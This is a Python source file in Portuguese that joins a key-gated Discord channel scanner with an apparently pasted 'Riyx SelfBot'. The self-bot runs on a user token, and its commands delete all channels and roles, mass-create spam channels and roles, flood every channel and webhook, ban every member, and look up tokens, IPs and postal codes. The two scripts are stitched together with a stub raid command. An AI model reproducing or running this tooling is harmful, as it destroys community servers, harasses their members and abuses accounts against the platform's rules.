import discord
import requests
import time
import threading
import os
import json
from datetime import datetime, timedelta

# =========================
# 📁 FILES
# =========================
KEY_FILE = "key_data.json"
CONFIG_FILE = "config.json"

# =========================
# 🔑 KEYS
# =========================
VALID_KEYS = {
    "CRYSTAL-IF-001": 1,
    "TESTE-123": 0.01
}

# =========================
# 🌐 GLOBAL
# =========================
CHANNEL_ID = None
HEADERS = {}

user_profiles = {}
seen = set()

# =========================
# 🔐 KEY SYSTEM
# =========================
def save_key(key, expire_at):
    with open(KEY_FILE, "w") as f:
        json.dump({
            "key": key,
            "expire_at": expire_at.timestamp()
        }, f)

def load_key():
    try:
        with open(KEY_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def is_key_valid(data):
    if not data:
        return False
    return datetime.now() <= datetime.fromtimestamp(data["expire_at"])

def login():
    saved = load_key()
    if saved and is_key_valid(saved):
        print("\n[+] Login automático via KEY salva\n")
        return True
    print("\n=== CRYSTAL IF | LOGIN ===\n")
    key = input("🔐 Key: ").strip()
    if key in VALID_KEYS:
        expire = datetime.now() + timedelta(days=VALID_KEYS[key])
        save_key(key, expire)
        print("\n[+] Acesso liberado\n")
        return True
    print("\n[-] KEY inválida\n")
    return False

# =========================
# ⚙️ CONFIG SYSTEM
# =========================
def save_config(token, channel_id):
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "token": token,
            "channel_id": channel_id
        }, f)

def load_config():
    try:
        with open(CONFIG_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def reset_config():
    if os.path.exists(CONFIG_FILE):
        os.remove(CONFIG_FILE)
    print("\n[+] Config resetada\n")

def setup_panel():
    print("\n=== PAINEL DE CONFIGURAÇÃO ===\n")
    token = input("🔑 Token (de usuário ou bot): ").strip()
    channel = input("📡 Channel ID: ").strip()
    save_config(token, channel)
    print("\n[+] Config salva\n")

def test_config(token, channel_id):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=1"
    headers = {"Authorization": token}
    r = requests.get(url, headers=headers)
    return r.status_code == 200

# =========================
# 🎨 BANNER
# =========================
BLUE = "\033[34m"
RESET = "\033[0m"

def banner():
    os.system("clear")
    print(BLUE + "CRYSTAL IF - SCANNER SYSTEM\n" + RESET)

# =========================
# 📡 SCANNER
# =========================
def fetch_messages(limit=20):
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit={limit}"
    return requests.get(url, headers=HEADERS).json()

def scanner_loop():
    global seen
    print("\n[+] Scanner iniciado...\n")
    while True:
        try:
            msgs = fetch_messages()
            if not isinstance(msgs, list):
                print("Erro ao buscar mensagens ou nenhuma mensagem retornada.")
                time.sleep(3)
                continue
            for m in msgs:
                if m["id"] in seen:
                    continue
                seen.add(m["id"])
                uid = m["author"]["id"]
                content = m.get("content", "")
                print(f"[{datetime.now().strftime('%H:%M:%S')}] {uid} | {content}")
            time.sleep(3)
        except Exception as e:
            print(f"Erro no scanner: {e}")
            time.sleep(3)

# =========================
# 🚀 START SCANNER SAFE
# =========================
def start_scanner():
    global TOKEN, CHANNEL_ID, HEADERS
    config = load_config()
    if not config:
        print("\n[-] Nenhuma config encontrada\n")
        setup_panel()
        config = load_config()
    if not test_config(config["token"], config["channel_id"]):
        print("\n[-] Config inválida ou token quebrado\n")
        setup_panel()
        config = load_config()
    TOKEN = config["token"]
    CHANNEL_ID = config["channel_id"]
    HEADERS = {"Authorization": TOKEN}
    threading.Thread(target=scanner_loop, daemon=True).start()
    threading.Thread(target=comando_input, daemon=True).start()
    while True:
        time.sleep(1)

# =========================
# 🧠 Thread de comando para enviar mensagem enquanto o scanner roda
# =========================
def comando_input():
    global TOKEN, CHANNEL_ID
    while True:
        cmd = input()
        if cmd.startswith("!enviar "):
            mensagem = cmd[len("!enviar "):]
            enviar_mensagem_discord(mensagem)
        elif cmd.lower() == "!sair":
            print("Encerrando comando input...")
            break
        elif cmd.lower() == "!raid":
            print("Tentando executar raid...")
            print("Envie a mensagem '!raid' no servidor para ativar o raid.")
        else:
            print("Comando não reconhecido.")

# =========================
# 📝 Função para enviar mensagem ao Discord
# =========================
def enviar_mensagem_discord(mensagem):
    global TOKEN, CHANNEL_ID
    url = f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages"
    headers = {
        "Authorization": TOKEN,
        "Content-Type": "application/json"
    }
    data = {
        "content": mensagem
    }
    r = requests.post(url, headers=headers, json=data)
    if r.status_code in [200, 201]:
        print("Mensagem enviada com sucesso!")
    else:
        print(f"Erro ao enviar mensagem: {r.status_code}")
        print(r.text)

# =========================
# =========================
# AQUI COMEÇA A PARTE DE COMANDOS DA NOVA VERSÃO (SELF-BOT) QUE VOCÊ ENVIOU
# =========================

import os, json
from time import sleep
clear = lambda: os.system("clear")

libs = ("python-discord", "requests", "colorama", "pyfiglet")

try:
	import discord, requests, pyfiglet
	from discord.ext import commands
	from colorama import Fore, init
except:
	print("Instalando Bibliotecas, Aguarde!")
	sleep(1)
	for lib in libs:
		os.system(f"pip install {lib}")
		
	import discord, requests, pyfiglet
	from discord.ext import commands
	from colorama import Fore, init
	
init(autoreset=True)
	
vermelho = Fore.RED
verde = Fore.GREEN
ciano = Fore.CYAN
roxo = Fore.MAGENTA
reset = Fore.RESET

add1 = reset + f"[{verde}+{reset}]"
add2 = reset + f"[{ciano}+{reset}]"
add3 = reset + f"[{roxo}+{reset}]"
a1 = reset + f"[{verde}!{reset}]"
a2 = reset + f"[{ciano}!{reset}]"
a3 = reset + f"[{roxo}!{reset}]"
m1 = reset + f"[{vermelho}-{reset}]"
pergunta1 = reset + f"[{ciano}?{reset}]"
pergunta2 = reset + f"[{vermelho}?{reset}]"
	
def banner(nome="banner", x=15):
	return pyfiglet.figlet_format(nome.center(x))
	
print(roxo + banner("Riyx", 30) + reset)

print(f"{roxo}Criado Por:{vermelho} HunterDep\n{roxo}YouTube: {vermelho}https://youtube.com/channel/UCyo1KzxCt9iJybQPFXmMOPg\n{roxo}GitHub: {vermelho}https://github.com/HunterDep\n")

token = input(f"{add2} {ciano}Token: {roxo}")
prefixo = input(f"{add2} {ciano}Prefixo: {roxo}")
logs = input(f"{pergunta1} {ciano}Logs (s/n): {roxo}").strip().lower()[0]

if not logs in "syn":
	print(f"{pergunta2}{ciano} Não Entendi! O Logs Vai ser {verde}Sim{reset}!")
	logs = "s"
	
print(f"\n{a3} {roxo}Conectando...{reset}")

intents = discord.Intents.all()

riyx = commands.Bot(command_prefix=prefixo, intents=intents, self_bot=True)

@riyx.event
async def on_ready():
	clear()
	
	print(roxo + banner("Riyx", 30) + reset)
	print(f"{roxo}Criado Por:{vermelho} HunterDep\n{roxo}YouTube: {vermelho}https://youtube.com/channel/UCyo1KzxCt9iJybQPFXmMOPg\n{roxo}GitHub: {vermelho}https://github.com/HunterDep\n")
	
	print(f"{add1} {verde}Conectado Em: {roxo}{riyx.user}")
	print(f"{add1} {verde}Comando de Ajuda: {roxo}{prefixo}ajuda")
	print(f"{add1} {verde}Versão: {roxo}V1")
	
	if logs in "sy":
		print(f"{add1} {verde}Logs: {roxo}Ativado!\n")
	else:
		print(f"{add1} {verde}Logs: {vermelho}Desativado!{reset}\n")
		
@riyx.command(name="ajuda")
async def ajuda(ctx):
	await ctx.message.delete()
	texto = f"""
**__Riyx SelfBot__**

**__Comandos de Nuke__**: 
```
	{prefixo}nc < número > < nome >: Nuke de Canais
	
	{prefixo}nr < número > < nome >: Nuke de Cargos
	
	{prefixo}webnuker: Raid de Webhooks no Servidor ||Configuração do comando no arquivo em JSON||
	
	{prefixo}chats < número > < mensagem >: Vai mandar o total de vezes as mensagens que você escolher
	
	{prefixo}banall: Bane Todos os Membros```
	
**__Comandos de Consulta__**:
```
	{prefixo}tokeninfo < token >: Informações do Token
	{prefixo}cepinfo < cep >: Informações do CEP
	{prefixo}ipinfo < ip >: Informações do IP
```
	"""
	await ctx.send(texto)
	
	if logs in "sy":
		
		print(f"{add3} {ciano}Comando Ajuda!{reset}")
		
@riyx.command(name="nc")
async def nc(ctx, n=20, *m):
	await ctx.message.delete()
	m = " ".join(m)
	
	if not m:
		m = "🤬 riyx selfbot"
		
	if logs in "sy":
		print(f"{add3} {ciano}Comando NC!{reset}")
		
	for canal in ctx.guild.channels:
		try:
			await canal.delete()
			if logs in "sy":
				print(f"{m1} {roxo}Deletando o Canal: {vermelho}{canal}{reset}")
		except:
			if logs in "sy":
				print(f"{m1} {roxo}Erro ao Deletar o Canal: {vermelho}{canal}{reset}")
			
	for canais in range(1, int(n)+1):
		try:
			await ctx.guild.create_text_channel(m)
			if logs in "sy":
				print(f"{add1} {roxo}Criei {verde}{canais}{roxo} Canais!{reset}")
		except:
			if logs in "sy":
				print(f"{m1} Error! Verifique se você tem Permissão Para Deletar Canais!")
			
	if logs in "sy":
		print(f"{add3} {roxo}Ataque Finalizado!{reset}")
		
		
@riyx.command(name="nr")
async def nr(ctx, n=20, *m):
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando NR{reset}")
	await ctx.message.delete()
	
	m = " ".join(m)
	
	if not m:
		m = "🤬 Riyx SelfBot"
		
	for cargo in ctx.guild.roles:
		try:
			await cargo.delete()
			if logs in "sy":
				print(f"{m1} {roxo}Deletei o Cargo: {vermelho}{cargo}{reset}")
		except:
			if logs in "sy":
				print(f"{m1} {roxo}Erro ao Deletar o Cargo: {vermelho}{cargo}{reset}")
			
	for cargos in range(1, int(n)+1):
		try:
			await ctx.guild.create_role(name=m)
			if logs in "sy":
				print(f"{add1} {roxo}Criei {verde}{cargos} {roxo}Cargos!{reset}")
		except:
			if logs in "sy":
				print(f"{m1} Error! Verifique se você tem Permissão Para Criar Cargos!")
		
	if logs in "sy":
		print(f"{add3}{roxo}Ataque Finalizado!{reset}")
		
@riyx.command(name="webnuker")
async def webnuker(ctx):
	await ctx.message.delete()
		
	if logs in "sy":
		print(f"{add3} {ciano}Comando WebNuker!{reset}")
		
	arqv = open("webnuker.json")
	dict = json.load(arqv)
	
	for canal in ctx.guild.channels:
		for x in range(dict["total"]):
			try:
				webhook = await ctx.channel.create_webhook(name=dict["nome"])
			
				await webhook.send(dict["mensagem"])
				
				if logs in "sy":
					print(f"{add1}{verde} Chat {roxo}{canal}{verde} Raidado!{reset}")
					
			except:
				if logs in "sy":
					print(f"{m1}{vermelho} Erro ao Raidar o Chat {roxo}{canal}{vermelho}!{reset}")
					continue
		
@riyx.command(name="chats")
async def chats(ctx, n=5, *m):
	
	await ctx.message.delete()
	
	m = " ".join(m)
	
	if logs in "sy":
		print(f"{add3}{ciano} Comando Chats!{reset}")
	
	if not m:
		m = "🤬 Riyx SelfBot"
		
	for canal in ctx.guild.channels:
		try:
			for x in range(int(n)):
				await canal.send(m)
			if logs in "sy":
				print(f"{add1}{verde} Chat {roxo}{canal}{verde} Raidado!{reset}")
		except:
			if logs in "sy":
				print(f"{m1}{vermelho} Erro ao Spamar no Chat {roxo}{canal}{vermelho}!{reset}")
		
@riyx.command(name="banall")
async def banall(ctx):
	
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando BanAll{reset}")
		
	for membros, membro in enumerate(ctx.guild.members):
		try:
			await membro.ban()
			if logs in "sy":
				print(f"{m1} {roxo}Membro Banido: {vermelho}{membro}")
		except:
				if logs in "sy":
					print(f"{m1} {roxo}Error ao Banir o Usuário: {vermelho}{membro}!{reset}")
					
	if logs in "sy":
		print(f"{add1} {roxo}Eu bani {vermelho}{membros}{roxo} Membros!{reset}")
				
@riyx.command(name="tokeninfo")
async def token_info(ctx, token):
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando TokenInfo!{reset}")
	
	req = requests.get("https://discord.com/api/v6/users/@me", headers={"Authorization": token}).json()
	infos = []
	
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos.append(f"[Token] {token}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
	
@riyx.command(name="cepinfo")
async def cepinfo(ctx, cep):
	
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando CEPInfo!{reset}")
	
	cep = cep.replace("+", ""); cep = cep.replace("-", ""); cep = cep.replace(".", "")
	
	req = requests.get(f"https://viacep.com.br/ws/{cep}/json/").json()
	infos = []
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
	
@riyx.command(name="ipinfo")
async def ipinfo(ctx, ip):
	await ctx.message.delete()
	
	if logs in "sy":
		print(f"{add3} {ciano}Comando IPInfo!{reset}")
	
	req = requests.get(f"http://ip-api.com/json/{ip}").json()
	infos = []
	for chave, valor in req.items():
		infos.append(f"[{chave[0].upper() + chave[1:]}] {valor}")
	infos = "\n".join(infos)
	
	await ctx.send(infos)
				
try:
	riyx.run(token, bot=False)
except Exception as Error:
	clear()
	print(f"{a3} {roxo} Error Detectado: {vermelho}{Error}")

